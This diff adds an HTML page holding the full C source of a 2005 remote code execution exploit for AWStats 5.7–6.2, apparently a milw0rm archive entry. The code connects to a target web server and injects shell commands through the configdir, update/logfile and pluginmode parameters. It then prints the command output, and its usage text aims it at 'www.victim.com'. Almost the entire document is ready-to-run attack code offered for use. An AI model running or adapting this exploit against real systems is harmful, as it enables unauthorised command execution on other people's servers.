@@ -1,0 +1,247 @@
+<html>
+<head>
+<title>AWStats 5.7 - 6.2 Multiple Remote Exploit</title>
+<pre>
+/****************************************************
+*                                                   *
+* AWStats v5.7 - v6.2                               *
+*                                                   *
+* sileAWSxpl                                        *
+* This exploit utilize three methods for exploiter  *
+* the vulnerability found on AWStats software.      *
+* an user can execute remote code on vulnerable     *
+* machine, with httpd privileges.                   *
+*                                                   *
+* References: www.securityfocus.org/bid/12543       *
+*                                                   *
+*  coded by: Silentium of Anacron Group Italy       *
+*      date: 24/02/2005                             *
+*    e-mail: anacrongroupitaly[at]autistici[dot]org *
+*   my_home: www.autistici.org/anacron-group-italy  *
+*                                                   *
+* this tool is developed under GPL license          *
+* no(c) .:. copyleft                                *
+*                                                   *
+****************************************************/
+
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;netinet/in.h&gt;
+#include &lt;netdb.h&gt;
+
+#define PORT 80                         // port of the web server
+#define CMDB 512                        // buffer length for commands
+#define BUFF 6000                       // buffer length for output's commands
+#define BANSTART &quot;SILENTIUM&quot;
+#define BANSTOP  &quot;anacron_group_italy&quot;
+
+void info(void);
+void sendxpl(FILE *out, char *argv[], int type);
+void readout(int sock, char *argv[]);
+void errgeth(void);
+void errsock(void);
+void errconn(void);
+void errsplo(void);
+void errbuff(void);
+
+int main(int argc, char *argv[]){
+
+FILE *out;
+int sock, sockconn, type;
+struct sockaddr_in addr;
+struct hostent *hp;
+
+if(argc != 5)
+  info();
+
+type = atoi(argv[4]);
+
+if(type &lt; 0 || type &gt; 3)
+  info();
+
+if((sock = socket(AF_INET, SOCK_STREAM, 0)) &lt; 0)
+  errsock();
+
+  system(&quot;clear&quot;);
+  printf(&quot;[*] Creating socket          [OK]\n&quot;);
+
+if((hp = gethostbyname(argv[1])) == NULL)
+  errgeth();
+
+  printf(&quot;[*] Resolving victim host    [OK]\n&quot;);
+
+memset(&amp;addr,0,sizeof(addr));
+memcpy((char *)&amp;addr.sin_addr,hp-&gt;h_addr,hp-&gt;h_length);
+addr.sin_family = AF_INET;
+addr.sin_port = htons(PORT);
+
+sockconn = connect(sock, (struct sockaddr *)&amp;addr, sizeof(addr));
+if(sockconn &lt; 0)
+  errconn();
+
+  printf(&quot;[*] Connecting at victim host   [OK]\n&quot;,argv[1]);
+
+out = fdopen(sock,&quot;a&quot;);
+setbuf(out,NULL);
+
+sendxpl(out, argv, type);
+
+  printf(&quot;[*] Sending exploit          [OK]\n&quot;);
+
+readout(sock, argv);
+
+shutdown(sock, 2);
+close(sock);
+fclose(out);
+
+return(0);
+
+}
+
+void info(void){
+
+system(&quot;clear&quot;);
+printf(&quot;#########################################\n&quot;
+      &quot;# AWStats v5.7 - v6.2                   #\n&quot;
+      &quot;# Remote Code Execution                 #\n&quot;
+      &quot;# exploit coded by Silentium            #\n&quot;
+      &quot;# Anacron Group Italy                   #\n&quot;
+      &quot;# www.autistici.org/anacron-group-italy #\n&quot;
+      &quot;#########################################\n\n&quot;
+      &quot;[Usage]\n\n&quot;
+      &quot; sileAWSxpl &lt;victim&gt; &lt;path_awstats&gt; &lt;cmd&gt; &lt;type&gt;\n\n&quot;
+      &quot;        [Type]\n&quot;
+      &quot;               1) ?configdir=|cmd|\n&quot;
+      &quot;               2) ?update=1&amp;logfile=|cmd|\n&quot;
+      &quot;               3) ?pluginmode=:system(\&quot;cmd\&quot;);\n\n&quot;
+      &quot;[example]\n\n&quot;
+      &quot; sileAWSxpl www.victim.com /cgi-bin/awstats.pl \&quot;uname -a\&quot; 3\n\n&quot;);
+exit(1);
+
+}
+
+void sendxpl(FILE *out, char *argv[], int type){
+
+char cmd[CMDB], cmd2[CMDB*3], cc;
+char *hex = &quot;0123456789abcdef&quot;;
+int i, j = 0, size;
+
+size = strlen(argv[3]);
+strncpy(cmd,argv[3],size);
+/*** Url Encoding Mode ON ***/
+
+for(i = 0; i &lt; size; i++){
+   cc = cmd[i];
+   if(cc &gt;= 'a' &amp;&amp; cc &lt;= 'z'
+   || cc &gt;= 'A' &amp;&amp; cc &lt;= 'Z'
+   || cc &gt;= '0' &amp;&amp; cc &lt;= '9'
+   || cc == '-' || cc == '_' || cc == '.')
+   cmd2[j++] = cc ;
+ else{
+      cmd2[j++] = '%';
+      cmd2[j++] = hex[cc &gt;&gt; 4];
+      cmd2[j++] = hex[cc &amp; 0x0f];
+     }
+}
+
+cmd2[j] = '\0';
+
+/*** Url Encoding Mode OFF ;P ***/
+
+if(type==1)
+  fprintf(out,&quot;GET %s?configdir=|echo;echo+%s;%s;echo+%s;echo| HTTP/1.0\n&quot;
+              &quot;Connection: Keep-Alive\n&quot;
+              &quot;Accept: text/html, image/jpeg, image/png, text/*, image/*,*/*\n&quot;
+              &quot;Accept-Encoding: x-gzip, x-deflate, gzip, deflate, identity\n&quot;
+              &quot;Accept-Charset: iso-8859-1, utf-8;q=0.5, *;q=0.5\n&quot;
+              &quot;Accept-Language: en\n&quot;
+              &quot;Host: %s\n\n&quot;,argv[2],BANSTART,cmd2,BANSTOP,argv[1]);
+else if(type==2)
+  fprintf(out,&quot;GET %s?update=1&amp;logfile=|echo;echo+%s;%s;echo+%s;echo| HTTP/1.0\n&quot;
+              &quot;Connection: Keep-Alive\n&quot;
+              &quot;Accept: text/html, image/jpeg, image/png, text/*, image/*,
+*/*\n&quot;
+              &quot;Accept-Encoding: x-gzip, x-deflate, gzip, deflate, identity\n&quot;
+              &quot;Accept-Charset: iso-8859-1, utf-8;q=0.5, *;q=0.5\n&quot;
+              &quot;Accept-Language: en\n&quot;
+              &quot;Host: %s\n\n&quot;,argv[2],BANSTART,cmd2,BANSTOP,argv[1]);
+else if(type==3)
+  fprintf(out,&quot;GET %s?pluginmode=:system(\&quot;echo+%s;%s;echo+%s\&quot;); HTTP/1.0\n&quot;
+              &quot;Connection: Keep-Alive\n&quot;
+              &quot;Accept: text/html, image/jpeg, image/png, text/*, image/*,
+*/*\n&quot;
+              &quot;Accept-Encoding: x-gzip, x-deflate, gzip, deflate, identity\n&quot;
+              &quot;Accept-Charset: iso-8859-1, utf-8;q=0.5, *;q=0.5\n&quot;
+              &quot;Accept-Language: en\n&quot;
+              &quot;Host: %s\n\n&quot;,argv[2],BANSTART,cmd2,BANSTOP,argv[1]);
+
+}
+
+void readout(int sock, char *argv[]){
+
+int i=0, flag;
+char output[BUFF], tmp;
+printf(&quot;[*] Output by %s:\n\n&quot;,argv[1]);
+
+while(strstr(output,BANSTART) == NULL){
+flag = read(sock,&amp;tmp,1);
+output[i++] = tmp;
+if(i &gt;= BUFF)
+  errbuff();
+if(flag==0)
+  errsplo();
+}
+while(strstr(output,BANSTOP) == NULL){
+read(sock,&amp;tmp,1);
+output[i++] = tmp;
+putchar(tmp);
+if(i &gt;= BUFF)
+  errbuff();
+}
+printf(&quot;\n\n&quot;);
+
+}
+
+void errsock(void){
+
+system(&quot;clear&quot;);
+printf(&quot;[x] Creating socket             [FAILED]\n\n&quot;);
+exit(1);
+
+}
+
+void errgeth(void){
+
+printf(&quot;[x] Resolving victim host       [FAILED]\n\n&quot;);
+exit(1);
+
+}
+
+void errconn(void){
+
+printf(&quot;[x] Connecting at victim host   [FAILED]\n\n&quot;);
+exit(1);
+
+}
+
+void errsplo(void){
+
+printf(&quot;[x] Exploiting victim host      [FAILED]\n\n&quot;);
+exit(1);
+
+}
+
+void errbuff(void){
+
+printf(&quot;[x] Your buffer for output's command is FULL !!!\n\n&quot;);
+exit(1);
+
+}
+
+// milw0rm.com [2005-02-24]
+</pre>
+</html>
+
